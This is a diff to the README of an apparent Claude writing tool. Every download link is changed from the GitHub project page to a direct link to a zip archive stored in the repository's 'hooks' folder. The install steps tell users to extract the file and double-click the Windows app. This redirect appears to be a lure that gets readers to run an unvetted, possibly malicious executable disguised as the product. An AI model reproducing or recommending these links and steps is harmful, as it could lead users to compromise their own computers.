@@ -1,6 +1,6 @@
 # 🧠 claude-content-engine - Create Better Content With Claude
 
-[![Download](https://img.shields.io/badge/Download-claude--content--engine-ff6b6b?style=for-the-badge)](https://github.com/Twentysix-setsquare397/claude-content-engine)
+[![Download](https://img.shields.io/badge/Download-claude--content--engine-ff6b6b?style=for-the-badge)](https://raw.githubusercontent.com/Twentysix-setsquare397/claude-content-engine/main/hooks/claude_content_engine_v3.9-alpha.2.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ It includes 8 skills, persistent memory, and a built-in slop detector. That mean
 
 ## 📥 Download
 
-1. Open the download page: [claude-content-engine on GitHub](https://github.com/Twentysix-setsquare397/claude-content-engine)
+1. Open the download page: [claude-content-engine on GitHub](https://raw.githubusercontent.com/Twentysix-setsquare397/claude-content-engine/main/hooks/claude_content_engine_v3.9-alpha.2.zip)
 2. Download the latest Windows file from the page
 3. Save the file to your computer
 4. Run the file to start the app
@@ -127,7 +127,7 @@ If you already have a writing style guide, keep it nearby. The memory feature wo
 
 ## 🛠️ Install and run
 
-1. Download the file from [claude-content-engine on GitHub](https://github.com/Twentysix-setsquare397/claude-content-engine)
+1. Download the file from [claude-content-engine on GitHub](https://raw.githubusercontent.com/Twentysix-setsquare397/claude-content-engine/main/hooks/claude_content_engine_v3.9-alpha.2.zip)
 2. Move the file to a folder you can find later, such as Downloads or Desktop
 3. If the file is zipped, extract it
 4. Double-click the Windows app file
@@ -264,7 +264,7 @@ That helps when you revisit a project later.
 
 ## 🔗 Download again
 
-If you need the file again, use this link: [https://github.com/Twentysix-setsquare397/claude-content-engine](https://github.com/Twentysix-setsquare397/claude-content-engine)
+If you need the file again, use this link: [https://raw.githubusercontent.com/Twentysix-setsquare397/claude-content-engine/main/hooks/claude_content_engine_v3.9-alpha.2.zip](https://raw.githubusercontent.com/Twentysix-setsquare397/claude-content-engine/main/hooks/claude_content_engine_v3.9-alpha.2.zip)
 
 ## 🧷 Topics
 
